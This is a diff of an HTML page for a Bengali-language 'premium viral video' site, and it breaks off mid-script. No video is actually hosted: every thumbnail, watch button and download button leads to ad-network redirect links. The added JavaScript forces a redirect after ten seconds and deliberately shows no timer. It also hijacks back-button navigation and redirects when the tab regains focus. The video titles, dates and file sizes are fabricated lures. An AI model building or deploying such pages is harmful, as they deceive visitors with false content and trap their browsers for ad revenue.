@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>All Hd Viral Video</title>
+    <title>প্রিমিয়ার লাইভ | প্রিমিয়াম ভিডিও হাব</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
             margin: 0;
@@ -12,528 +13,458 @@
         }
 
         body {
-            background: #0a0e17;
-            font-family: 'Segoe UI', 'Poppins', system-ui, -apple-system, 'Roboto', sans-serif;
-            color: #ededed;
-            padding: 22px 18px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0f1e 0%, #0a1a2f 50%, #0b132b 100%);
+            color: #fff;
+            line-height: 1.6;
+            min-height: 100vh;
+            overflow-x: hidden;
         }
 
         .container {
-            max-width: 1400px;
+            max-width: 1300px;
             margin: 0 auto;
+            padding: 20px;
         }
 
-        /* হেডার স্টাইল - ওয়েবসাইটের নাম */
-        .header-area {
+        .premium-header {
             text-align: center;
-            margin-bottom: 35px;
+            padding: 40px 20px 30px;
+            margin-bottom: 40px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 60px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
         }
 
-        .site-title {
-            font-size: 2.8rem;
+        .logo {
+            font-size: 3.5rem;
             font-weight: 800;
-            background: linear-gradient(135deg, #ff2e5f, #ff9a3c, #ffd700, #0ff);
+            background: linear-gradient(135deg, #FFD700, #FF6B6B, #4ECDC4);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            letter-spacing: 2px;
-            text-shadow: 0 0 20px rgba(255, 46, 95, 0.3);
-            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(255,215,0,0.3);
         }
 
-        .trend-badge {
-            background: linear-gradient(125deg, #ff2e5f, #f9a03f);
-            display: inline-block;
-            padding: 6px 22px;
-            border-radius: 60px;
-            font-weight: bold;
-            font-size: 0.85rem;
-            letter-spacing: 0.5px;
-            margin-bottom: 18px;
-            box-shadow: 0 0 12px rgba(255, 46, 95, 0.4);
+        .tagline {
+            font-size: 1.2rem;
+            color: rgba(255,255,255,0.8);
+            margin-top: 15px;
         }
 
-        .stats {
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(4px);
+        .premium-badge {
             display: inline-block;
+            background: linear-gradient(90deg, #FFD700, #FFA500);
             padding: 5px 20px;
             border-radius: 40px;
             font-size: 0.8rem;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-
-        /* ট্রেন্ডিং মেসেজ সেকশন */
-        .trending-message {
-            text-align: center;
-            margin: 15px 0 30px;
-        }
-
-        .trending-box {
-            background: linear-gradient(135deg, #1a1f2e, #0f1320);
-            border: 1px solid rgba(255, 75, 43, 0.4);
-            padding: 14px 24px;
-            border-radius: 60px;
-            display: inline-block;
             font-weight: bold;
-            font-size: 1rem;
-            color: #ffaa77;
-            letter-spacing: 0.5px;
-            box-shadow: 0 0 15px rgba(255, 75, 43, 0.2);
-            backdrop-filter: blur(4px);
+            color: #1a1a2e;
+            margin-top: 15px;
         }
 
-        .trending-box span {
-            background: #ff4b2b;
+        .info-message {
+            background: linear-gradient(135deg, rgba(255,215,0,0.15), rgba(255,107,107,0.1));
+            border: 1px solid rgba(255,215,0,0.4);
+            border-radius: 50px;
+            padding: 12px 25px;
+            margin-top: 20px;
             display: inline-block;
-            padding: 2px 12px;
-            border-radius: 40px;
-            font-size: 0.7rem;
-            margin-right: 10px;
-            color: white;
+            font-size: 0.95rem;
+            color: #FFD700;
+            backdrop-filter: blur(5px);
         }
 
-        /* গ্যালারি গ্রিড */
-        .gallery {
+        .info-message i {
+            margin-right: 8px;
+            color: #FF6B6B;
+        }
+
+        .videos-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
-            gap: 28px;
-            margin: 35px 0;
+            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
+            gap: 35px;
         }
 
-        .card {
-            background: #11151f;
+        .video-card {
+            background: rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(12px);
             border-radius: 28px;
             overflow: hidden;
-            transition: all 0.3s ease;
-            border: 1px solid #282e3f;
-            box-shadow: 0 20px 28px -12px rgba(0, 0, 0, 0.6);
-            cursor: default;
-            position: relative;
+            transition: all 0.4s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
         }
 
-        .card:hover {
-            transform: translateY(-6px);
-            border-color: #ff7840;
-            box-shadow: 0 28px 32px -12px #ff4b2b40;
+        .video-card:hover {
+            transform: translateY(-12px);
+            border-color: rgba(255, 215, 0, 0.5);
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.4), 0 0 20px rgba(255,215,0,0.2);
         }
 
-        /* ছবি ধারক - ভিডিও দেখুন বাটনের মতো লাইটিং ইফেক্ট */
-        .img-frame {
+        .video-info-top {
+            padding: 20px 20px 0 20px;
+        }
+
+        .video-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, #fff, #FFD700);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 15px;
+            border-radius: 20px;
+            margin-bottom: 20px;
+        }
+
+        .info-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.85rem;
+            color: #ddd;
+        }
+
+        .info-item i {
+            width: 28px;
+            color: #FFD700;
+        }
+
+        .thumbnail-container {
             position: relative;
+            overflow: hidden;
+            margin: 0 15px 15px 15px;
+            border-radius: 20px;
+            cursor: pointer;
+            background: #1a1a2e;
+            min-height: 220px;
+        }
+
+        .thumbnail {
             width: 100%;
-            aspect-ratio: 16 / 9;
-            background: #020408;
+            height: 220px;
+            object-fit: cover;
+            transition: transform 0.5s ease;
+            border-radius: 20px;
+        }
+
+        .video-card:hover .thumbnail {
+            transform: scale(1.05);
+        }
+
+        .play-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.4);
             display: flex;
             align-items: center;
             justify-content: center;
-            overflow: hidden;
-            cursor: pointer;
-            /* ছবির সাইডে লাইটিং ইফেক্ট - ভিডিও দেখুন বাটনের মতো একই অ্যানিমেশন */
-            box-shadow: 0 0 8px #ff4b2b, inset 0 0 5px rgba(255, 75, 43, 0.2);
-            animation: btnLight 2s ease-in-out infinite;
-            border-radius: 0;
+            opacity: 0;
+            transition: opacity 0.3s;
+            border-radius: 20px;
         }
 
-        @keyframes btnLight {
-            0% {
-                box-shadow: 0 0 5px #ff4b2b, inset 0 0 3px rgba(255, 75, 43, 0.1);
-            }
-            50% {
-                box-shadow: 0 0 20px #ff4b2b, 0 0 8px #ff8a5c, inset 0 0 10px rgba(255, 75, 43, 0.3);
-            }
-            100% {
-                box-shadow: 0 0 5px #ff4b2b, inset 0 0 3px rgba(255, 75, 43, 0.1);
-            }
+        .thumbnail-container:hover .play-overlay {
+            opacity: 1;
         }
 
-        .img-frame img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain;
-            transition: transform 0.4s;
-            pointer-events: none;
-        }
-
-        .card:hover .img-frame img {
-            transform: scale(1.02);
-        }
-
-        /* প্লে বাটন - ছবির মাঝখানে */
-        .play-button {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 70px;
-            height: 70px;
-            background: rgba(255, 75, 43, 0.9);
+        .play-btn {
+            width: 65px;
+            height: 65px;
+            background: linear-gradient(135deg, #FFD700, #FF6B6B);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: all 0.3s ease;
-            box-shadow: 0 0 20px rgba(255, 75, 43, 0.6);
-            cursor: pointer;
-            z-index: 10;
-            pointer-events: auto;
+            font-size: 1.8rem;
+            color: #1a1a2e;
+            transition: transform 0.3s;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
 
-        .play-button:hover {
-            transform: translate(-50%, -50%) scale(1.1);
-            background: #ff4b2b;
-            box-shadow: 0 0 30px rgba(255, 75, 43, 0.9);
-        }
-
-        .play-button svg {
-            width: 35px;
-            height: 35px;
-            fill: white;
-            margin-left: 5px;
-        }
-
-        /* বাটন গ্রুপ */
-        .btn-group {
-            padding: 18px 16px 22px;
+        .loading-thumbnail {
+            width: 100%;
+            height: 220px;
+            background: linear-gradient(90deg, #2a2a3e, #3a3a5e, #2a2a3e);
+            background-size: 200% 100%;
+            animation: loading 1.5s infinite;
+            border-radius: 20px;
             display: flex;
-            flex-wrap: wrap;
-            gap: 12px;
+            align-items: center;
             justify-content: center;
+            color: #FFD700;
+            font-size: 1rem;
         }
 
-        .btn {
-            flex: 1;
-            min-width: 108px;
+        .loading-thumbnail::after {
+            content: "📹 লোড হচ্ছে...";
+            opacity: 0.7;
+        }
+
+        @keyframes loading {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+
+        .download-text {
             text-align: center;
-            padding: 11px 5px;
-            border-radius: 50px;
-            font-weight: 700;
+            padding: 10px 15px;
             font-size: 0.8rem;
-            text-decoration: none;
-            transition: 0.2s;
+            color: #FFD700;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            margin: 0 15px;
+        }
+
+        .button-container {
+            display: flex;
+            gap: 15px;
+            padding: 5px 15px 20px 15px;
+            flex-wrap: wrap;
+        }
+
+        .premier-btn, .premium-plus-btn {
+            flex: 1;
+            padding: 14px 10px;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: bold;
             cursor: pointer;
-            font-family: inherit;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            text-decoration: none;
             border: none;
-            backdrop-filter: blur(2px);
-            display: inline-block;
-            position: relative;
+            transition: all 0.3s ease;
         }
 
-        /* ভিডিও দেখুন বাটনে লাইটিং ইফেক্ট */
-        .btn-watch {
-            background: linear-gradient(105deg, #da2c6b, #ff7e4a);
+        .premier-btn {
+            background: linear-gradient(90deg, #FF6B6B, #FF8E53);
             color: white;
-            box-shadow: 0 0 8px #ff4b2b, 0 3px 10px #da2c6b50;
-            animation: btnLight 2s ease-in-out infinite;
+            box-shadow: 0 5px 15px rgba(255,107,107,0.3);
         }
 
-        .btn-watch:hover {
-            background: linear-gradient(105deg, #ff416c, #ff9a60);
-            transform: scale(0.97);
-            animation: none;
-            box-shadow: 0 0 25px #ff4b2b, 0 0 10px #ff8a5c;
+        .premier-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(255,107,107,0.5);
         }
 
-        /* ডাউনলোড বাটনে লাইটিং ইফেক্ট */
-        .btn-download {
-            background: rgba(0, 210, 200, 0.12);
-            border: 1px solid #0ff;
-            color: #a2fff0;
-            animation: downloadLight 2s ease-in-out infinite;
+        .premium-plus-btn {
+            border: 1px solid rgba(255,215,0,0.6);
+            background: rgba(0,0,0,0.4);
+            color: #FFD700;
+            backdrop-filter: blur(5px);
         }
 
-        @keyframes downloadLight {
-            0% {
-                box-shadow: 0 0 3px #0ff, inset 0 0 2px rgba(0, 255, 255, 0.2);
-                border-color: #0ff;
-            }
-            50% {
-                box-shadow: 0 0 15px #0ff, 0 0 5px #0ff, inset 0 0 5px rgba(0, 255, 255, 0.3);
-                border-color: #88ffff;
-            }
-            100% {
-                box-shadow: 0 0 3px #0ff, inset 0 0 2px rgba(0, 255, 255, 0.2);
-                border-color: #0ff;
-            }
+        .premium-plus-btn:hover {
+            background: rgba(255,215,0,0.2);
+            transform: translateY(-3px);
+            border-color: #FFD700;
+            box-shadow: 0 0 20px rgba(255,215,0,0.3);
         }
 
-        .btn-download:hover {
-            background: rgba(0, 255, 200, 0.2);
-            border-color: #ffee88;
-            color: #ffefb0;
-            animation: none;
-            box-shadow: 0 0 20px #0ff, 0 0 8px #88ffff;
-        }
-
-        /* রাশিয়ান ভিডিও বাটনে লাইটিং ইফেক্ট */
-        .btn-russian {
-            background: #1f2a34;
-            border: 1px solid #ffb347;
-            color: #ffd59e;
-            animation: russianLight 2s ease-in-out infinite;
-        }
-
-        @keyframes russianLight {
-            0% {
-                box-shadow: 0 0 3px #ffb347, inset 0 0 2px rgba(255, 180, 71, 0.2);
-                border-color: #ffb347;
-            }
-            50% {
-                box-shadow: 0 0 15px #ffb347, 0 0 5px #ffcc66, inset 0 0 5px rgba(255, 180, 71, 0.3);
-                border-color: #ffcc77;
-            }
-            100% {
-                box-shadow: 0 0 3px #ffb347, inset 0 0 2px rgba(255, 180, 71, 0.2);
-                border-color: #ffb347;
-            }
-        }
-
-        .btn-russian:hover {
-            background: #2f4052;
-            color: #ffe6c2;
-            animation: none;
-            box-shadow: 0 0 20px #ffb347, 0 0 8px #ffdd88;
-        }
-
-        .footer-note {
+        .premium-footer {
+            margin-top: 60px;
             text-align: center;
-            margin-top: 45px;
-            padding: 18px;
-            border-top: 1px solid #1f2533;
-            font-size: 0.7rem;
-            color: #8f92a2;
+            padding: 35px 20px;
+            background: rgba(0,0,0,0.4);
+            border-radius: 30px;
         }
 
-        @media (max-width: 640px) {
-            body {
-                padding: 14px;
-            }
-            .site-title {
-                font-size: 1.8rem;
-            }
-            .btn {
-                font-size: 0.68rem;
-                min-width: 85px;
-                padding: 9px 4px;
-            }
-            .play-button {
-                width: 55px;
-                height: 55px;
-            }
-            .play-button svg {
-                width: 28px;
-                height: 28px;
-            }
-            .trending-box {
-                font-size: 0.8rem;
-                padding: 10px 18px;
-            }
+        .footer-text {
+            color: rgba(255,255,255,0.6);
+            font-size: 0.85rem;
+        }
+
+        @media (max-width: 768px) {
+            .container { padding: 10px; }
+            .videos-grid { grid-template-columns: 1fr; }
+            .video-title { font-size: 1.3rem; }
+            .info-grid { grid-template-columns: 1fr; }
+            .button-container { flex-direction: column; }
+            .logo { font-size: 2.5rem; }
+            .info-message { font-size: 0.8rem; padding: 8px 18px; }
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="header-area">
-        <div class="site-title">All Hd Viral Video</div>
-        <div class="trend-badge">⚡ ভাইরাল লিংক হাব 2.0 ⚡</div>
-        <div class="stats">🔥 701k সাবস্ক্রাইবার • আজকের হটেস্ট 🔥</div>
-    </div>
-
-    <!-- ট্রেন্ডিং মেসেজ -->
-    <div class="trending-message">
-        <div class="trending-box">
-            <span>🔥 TRENDING 🔥</span> সমস্ত ভাইরাল ভিডিও এখানে দেখুন এবং উপভোগ করুন
+    <div class="premium-header">
+        <div class="logo">🎬 প্রিমিয়ার লাইভ</div>
+        <div class="tagline">প্রিমিয়াম কন্টেন্টের অসাধারণ সংগ্রহ</div>
+        <div class="premium-badge">✦ প্রিমিয়াম সাবস্ক্রাইবারদের জন্য এক্সক্লুসিভ ✦</div>
+        <div class="info-message">
+            <i class="fas fa-infinity"></i> সমস্ত প্রিমিয়াম কালেকশন এবং ভাইরাল ভিডিও দেখতে ও ডাউনলোড করতে পারবেন
         </div>
     </div>
 
-    <!-- গ্যালারি: ৭টি ছবি -->
-    <div class="gallery">
-        <!-- ছবি ১ -->
-        <div class="card">
-            <div class="img-frame" data-img-link="https://www.profitablecpmratenetwork.com/h5cb0j04?key=5762f42b903a067d66063f8489696d97">
-                <img src="https://i.ibb.co.com/CKbrwFND/IMG-20260503-151459-747.jpg" alt="ভিডিও থাম্বনেইল">
-                <div class="play-button">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M8 5v14l11-7z"/>
-                    </svg>
-                </div>
-            </div>
-            <div class="btn-group">
-                <a href="#" class="btn btn-watch" data-link="https://otieu.com/4/10559434">🎬 ভিডিও দেখুন</a>
-                <a href="#" class="btn btn-download" data-link="https://www.profitablecpmratenetwork.com/hbfh3tsx?key=69d41201781e1eef842f24d3158e6b9c">⬇️ ভিডিও ডাউনলোড করুন</a>
-                <a href="#" class="btn btn-russian" data-link="https://otieu.com/4/10559433">🇷🇺 এইচডি রাশিয়ান ভিডিও দেখুন</a>
-            </div>
-        </div>
-        <!-- ছবি ২ -->
-        <div class="card">
-            <div class="img-frame" data-img-link="https://www.profitablecpmratenetwork.com/h5cb0j04?key=5762f42b903a067d66063f8489696d97">
-                <img src="https://i.ibb.co.com/LX6qskvQ/IMG-20260503-151511-668.jpg" alt="ভিডিও থাম্বনেইল">
-                <div class="play-button">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M8 5v14l11-7z"/>
-                    </svg>
-                </div>
-            </div>
-            <div class="btn-group">
-                <a href="#" class="btn btn-watch" data-link="https://otieu.com/4/10559434">🎬 ভিডিও দেখুন</a>
-                <a href="#" class="btn btn-download" data-link="https://www.profitablecpmratenetwork.com/hbfh3tsx?key=69d41201781e1eef842f24d3158e6b9c">⬇️ ভিডিও ডাউনলোড করুন</a>
-                <a href="#" class="btn btn-russian" data-link="https://otieu.com/4/10559433">🇷🇺 এইচডি রাশিয়ান ভিডিও দেখুন</a>
-            </div>
-        </div>
-        <!-- ছবি ৩ -->
-        <div class="card">
-            <div class="img-frame" data-img-link="https://www.profitablecpmratenetwork.com/h5cb0j04?key=5762f42b903a067d66063f8489696d97">
-                <img src="https://i.ibb.co.com/RTrLs0fZ/Screenshot-20260503-182304-Telegram.jpg" alt="ভিডিও থাম্বনেইল">
-                <div class="play-button">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M8 5v14l11-7z"/>
-                    </svg>
-                </div>
-            </div>
-            <div class="btn-group">
-                <a href="#" class="btn btn-watch" data-link="https://otieu.com/4/10559434">🎬 ভিডিও দেখুন</a>
-                <a href="#" class="btn btn-download" data-link="https://www.profitablecpmratenetwork.com/hbfh3tsx?key=69d41201781e1eef842f24d3158e6b9c">⬇️ ভিডিও ডাউনলোড করুন</a>
-                <a href="#" class="btn btn-russian" data-link="https://otieu.com/4/10559433">🇷🇺 এইচডি রাশিয়ান ভিডিও দেখুন</a>
-            </div>
-        </div>
-        <!-- ছবি ৪ -->
-        <div class="card">
-            <div class="img-frame" data-img-link="https://www.profitablecpmratenetwork.com/h5cb0j04?key=5762f42b903a067d66063f8489696d97">
-                <img src="https://i.ibb.co.com/7LNXmKc/1777798651331.jpg" alt="ভিডিও থাম্বনেইল">
-                <div class="play-button">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M8 5v14l11-7z"/>
-                    </svg>
-                </div>
-            </div>
-            <div class="btn-group">
-                <a href="#" class="btn btn-watch" data-link="https://otieu.com/4/10559434">🎬 ভিডিও দেখুন</a>
-                <a href="#" class="btn btn-download" data-link="https://www.profitablecpmratenetwork.com/hbfh3tsx?key=69d41201781e1eef842f24d3158e6b9c">⬇️ ভিডিও ডাউনলোড করুন</a>
-                <a href="#" class="btn btn-russian" data-link="https://otieu.com/4/10559433">🇷🇺 এইচডি রাশিয়ান ভিডিও দেখুন</a>
-            </div>
-        </div>
-        <!-- ছবি ৫ -->
-        <div class="card">
-            <div class="img-frame" data-img-link="https://www.profitablecpmratenetwork.com/h5cb0j04?key=5762f42b903a067d66063f8489696d97">
-                <img src="https://i.ibb.co.com/1Gnkqx4X/1777798746717.jpg" alt="ভিডিও থাম্বনেইল">
-                <div class="play-button">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M8 5v14l11-7z"/>
-                    </svg>
-                </div>
-            </div>
-            <div class="btn-group">
-                <a href="#" class="btn btn-watch" data-link="https://otieu.com/4/10559434">🎬 ভিডিও দেখুন</a>
-                <a href="#" class="btn btn-download" data-link="https://www.profitablecpmratenetwork.com/hbfh3tsx?key=69d41201781e1eef842f24d3158e6b9c">⬇️ ভিডিও ডাউনলোড করুন</a>
-                <a href="#" class="btn btn-russian" data-link="https://otieu.com/4/10559433">🇷🇺 এইচডি রাশিয়ান ভিডিও দেখুন</a>
-            </div>
-        </div>
-        <!-- ছবি ৬ -->
-        <div class="card">
-            <div class="img-frame" data-img-link="https://www.profitablecpmratenetwork.com/h5cb0j04?key=5762f42b903a067d66063f8489696d97">
-                <img src="https://i.ibb.co.com/ym6jfL5b/IMG-20260503-151325-009.jpg" alt="ভিডিও থাম্বনেইল">
-                <div class="play-button">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M8 5v14l11-7z"/>
-                    </svg>
-                </div>
-            </div>
-            <div class="btn-group">
-                <a href="#" class="btn btn-watch" data-link="https://otieu.com/4/10559434">🎬 ভিডিও দেখুন</a>
-                <a href="#" class="btn btn-download" data-link="https://www.profitablecpmratenetwork.com/hbfh3tsx?key=69d41201781e1eef842f24d3158e6b9c">⬇️ ভিডিও ডাউনলোড করুন</a>
-                <a href="#" class="btn btn-russian" data-link="https://otieu.com/4/10559433">🇷🇺 এইচডি রাশিয়ান ভিডিও দেখুন</a>
-            </div>
-        </div>
-        <!-- ছবি ৭ -->
-        <div class="card">
-            <div class="img-frame" data-img-link="https://www.profitablecpmratenetwork.com/h5cb0j04?key=5762f42b903a067d66063f8489696d97">
-                <img src="https://i.ibb.co.com/q3PfLFcz/1777799189312.jpg" alt="ভিডিও থাম্বনেইল">
-                <div class="play-button">
-                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M8 5v14l11-7z"/>
-                    </svg>
-                </div>
-            </div>
-            <div class="btn-group">
-                <a href="#" class="btn btn-watch" data-link="https://otieu.com/4/10559434">🎬 ভিডিও দেখুন</a>
-                <a href="#" class="btn btn-download" data-link="https://www.profitablecpmratenetwork.com/hbfh3tsx?key=69d41201781e1eef842f24d3158e6b9c">⬇️ ভিডিও ডাউনলোড করুন</a>
-                <a href="#" class="btn btn-russian" data-link="https://otieu.com/4/10559433">🇷🇺 এইচডি রাশিয়ান ভিডিও দেখুন</a>
-            </div>
-        </div>
-    </div>
+    <div id="videosContainer" class="videos-grid"></div>
 
-    <div class="footer-note">
-        🔞 রিয়েল টাইম কন্টেন্ট • ইউজার জেনারেটেড • All Hd Viral Video
+    <div class="premium-footer">
+        <div class="footer-text">© ২০২৫ প্রিমিয়ার লাইভ। সকল অধিকার সংরক্ষিত。<br>এই ওয়েবসাইটের সমস্ত কন্টেন্ট কপিরাইট আইনের আওতাভুক্ত।</div>
     </div>
 </div>
 
 <script>
-    // ========================
-    // ৬ সেকেন্ড পর রিডাইরেক্ট
-    // ========================
-    setTimeout(function() {
-        window.location.href = "https://www.profitablecpmratenetwork.com/hbfh3tsx?key=69d41201781e1eef842f24d3158e6b9c";
-    }, 6000);
+    // ========== রিডাইরেক্ট ইউআরএল ==========
+    const REDIRECT_URL = "https://www.effectivegatecpm.com/wih1hzxn9h?key=d8e45fba8c41f91eb953cbccaa7194bf";
+    
+    // ========== ভিডিও কনফিগারেশন ==========
+    const videosConfig = [
+        { 
+            id: 1, 
+            title: "বিশেষ প্রিমিয়াম ভিডিও: পর্ব ১", 
+            thumbnailUrl: "https://i.ibb.co.com/gL8kXKyf/images-2.jpg", 
+            downloadLink: "https://otieu.com/4/10559434", 
+            watchLink: "https://www.effectivegatecpm.com/wih1hzxn9h?key=d8e45fba8c41f91eb953cbccaa7194bf", 
+            videoInfo: { uploadDate: "২৫ জুন, ২০২৩", duration: "০৩:৪৪ মিনিট", format: "MP4 (1080p)", size: "২৪ এমবি" } 
+        },
+        { 
+            id: 2, 
+            title: "এক্সক্লুসিভ ভিডিও: পর্ব ২", 
+            thumbnailUrl: "https://i.ibb.co.com/5gjfgtYw/1775713980538.jpg", 
+            downloadLink: "https://www.effectivegatecpm.com/hbfh3tsx?key=69d41201781e1eef842f24d3158e6b9c", 
+            watchLink: "https://otieu.com/4/10559434", 
+            videoInfo: { uploadDate: "২৬ জুন, ২০২৩", duration: "০৫:১২ মিনিট", format: "MP4 (720p)", size: "৩৫ এমবি" } 
+        },
+        { 
+            id: 3, 
+            title: "প্রিমিয়াম কন্টেন্ট: পর্ব ৩", 
+            thumbnailUrl: "https://i.ibb.co.com/C5G1vW52/images-3.jpg", 
+            downloadLink: "https://otieu.com/4/10559433", 
+            watchLink: "https://www.effectivegatecpm.com/hbfh3tsx?key=69d41201781e1eef842f24d3158e6b9c", 
+            videoInfo: { uploadDate: "২৭ জুন, ২০২৩", duration: "০৪:২০ মিনিট", format: "MP4 (1080p)", size: "৪২ এমবি" } 
+        },
+        { 
+            id: 4, 
+            title: "বিশেষ এপিসোড: পর্ব ৪", 
+            thumbnailUrl: "https://i.ibb.co.com/20Sds44P/1775758212087.jpg", 
+            downloadLink: "https://www.effectivegatecpm.com/wih1hzxn9h?key=d8e45fba8c41f91eb953cbccaa7194bf", 
+            watchLink: "https://www.effectivegatecpm.com/hbfh3tsx?key=69d41201781e1eef842f24d3158e6b9c", 
+            videoInfo: { uploadDate: "২৮ জুন, ২০২৩", duration: "০৬:০৫ মিনিট", format: "MP4 (1080p)", size: "৫৫ এমবি" } 
+        }
+    ];
+    
+    const defaultThumbnail = "https://i.ibb.co.com/gL8kXKyf/images-2.jpg";
+    let redirectOccurred = false;
 
-    // ========================
-    // ছবি বা প্লে বাটনে ক্লিক করলে
-    // ========================
-    const allImgFrames = document.querySelectorAll('.img-frame');
-    allImgFrames.forEach(frame => {
-        const imgLink = frame.getAttribute('data-img-link');
-        frame.addEventListener('click', function(e) {
-            if (e.target.closest('.play-button')) return;
-            window.location.href = imgLink;
+    function performRedirect(url) {
+        if(redirectOccurred) return;
+        redirectOccurred = true;
+        window.location.href = url;
+    }
+
+    function thumbnailLoaded(videoId) {
+        const img = document.getElementById(`thumb-${videoId}`);
+        const loading = document.getElementById(`loading-${videoId}`);
+        if(img && loading) {
+            loading.style.display = 'none';
+            img.style.display = 'block';
+        }
+    }
+
+    function thumbnailError(videoId) {
+        const img = document.getElementById(`thumb-${videoId}`);
+        const loading = document.getElementById(`loading-${videoId}`);
+        if(img && loading) {
+            img.src = defaultThumbnail;
+            loading.style.display = 'none';
+            img.style.display = 'block';
+        }
+    }
+
+    // ব্যাক বাটন চেক
+    function setupBackButtonRedirect() {
+        let lastUrl = location.href;
+        setInterval(() => {
+            if(redirectOccurred) return;
+            if(location.href !== lastUrl) {
+                lastUrl = location.href;
+                if(!redirectOccurred) {
+                    performRedirect(REDIRECT_URL);
+                }
+            }
+        }, 300);
+    }
+
+    // পেজ ভিজিবিলিটি চেক
+    function setupVisibilityRedirect() {
+        document.addEventListener('visibilitychange', function() {
+            if(redirectOccurred) return;
+            if(document.visibilityState === 'visible') {
+                if(!redirectOccurred) {
+                    performRedirect(REDIRECT_URL);
+                }
+            }
         });
+    }
+
+    function createVideoCard(video) {
+        return `
+            <div class="video-card" data-video-id="${video.id}">
+                <div class="video-info-top">
+                    <h2 class="video-title">🎥 ${video.title}</h2>
+                    <div class="info-grid">
+                        <div class="info-item"><i class="fas fa-calendar-alt"></i> <span>${video.videoInfo.uploadDate}</span></div>
+                        <div class="info-item"><i class="fas fa-clock"></i> <span>${video.videoInfo.duration}</span></div>
+                        <div class="info-item"><i class="fas fa-file-video"></i> <span>${video.videoInfo.format}</span></div>
+                        <div class="info-item"><i class="fas fa-database"></i> <span>${video.videoInfo.size}</span></div>
+                    </div>
+                </div>
+                <div class="thumbnail-container" onclick="window.open('${video.watchLink}', '_blank')">
+                    <div class="loading-thumbnail" id="loading-${video.id}"></div>
+                    <img src="${video.thumbnailUrl}" class="thumbnail" id="thumb-${video.id}" style="display:none;" onload="thumbnailLoaded(${video.id})" onerror="thumbnailError(${video.id})" alt="প্রিমিয়াম থাম্বনেইল">
+                    <div class="play-overlay">
+                        <div class="play-btn"><i class="fas fa-play"></i></div>
+                    </div>
+                </div>
+                <div class="download-text">
+                    ফুল ভিডিও ডাউনলোড করুন
+                </div>
+                <div class="button-container">
+                    <a href="${video.downloadLink}" class="premier-btn" target="_blank"><i class="fas fa-download"></i> 🎬 ডাউনলোড করুন</a>
+                    <button class="premium-plus-btn" onclick="window.open('${video.watchLink}', '_blank')"><i class="fas fa-play-circle"></i> ⭐ সরাসরি দেখুন</button>
+                </div>
+            </div>
+        `;
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+        const container = document.getElementById('videosContainer');
+        if(container) {
+            videosConfig.forEach(video => {
+                container.innerHTML += createVideoCard(video);
+            });
+        }
+        
+        setupBackButtonRedirect();
+        setupVisibilityRedirect();
+        
+        console.log(`✅ ${videosConfig.length} টি প্রিমিয়াম ভিডিও লোড হয়েছে`);
+        console.log(`⏰ ১০ সেকেন্ড পর স্বয়ংক্রিয়ভাবে রিডাইরেক্ট হবে (কোনো টাইমার দেখানো হবে না)`);
+        
+        // ১০ সেকেন্ড পর অটো রিডাইরেক্ট - কোনো টাইমার ভিজুয়াল ছাড়া
+        setTimeout(() => {
+            if(!redirectOccurred) {
+                performRedirect(REDIRECT_URL);
+            }
+        }, 10000);
     });
-
-    // প্লে বাটনে ক্লিক
-    const playBtns = document.querySelectorAll('.play-button');
-    playBtns.forEach(btn => {
-        btn.addEventListener('click', function(e) {
-            e.stopPropagation();
-            const parentFrame = this.closest('.img-frame');
-            const imgLink = parentFrame.getAttribute('data-img-link');
-            window.location.href = imgLink;
-        });
-    });
-
-    // ========================
-    // ভিডিও দেখুন / ডাউনলোড / রাশিয়ান বাটন
-    // ========================
-    const watchBtns = document.querySelectorAll('.btn-watch');
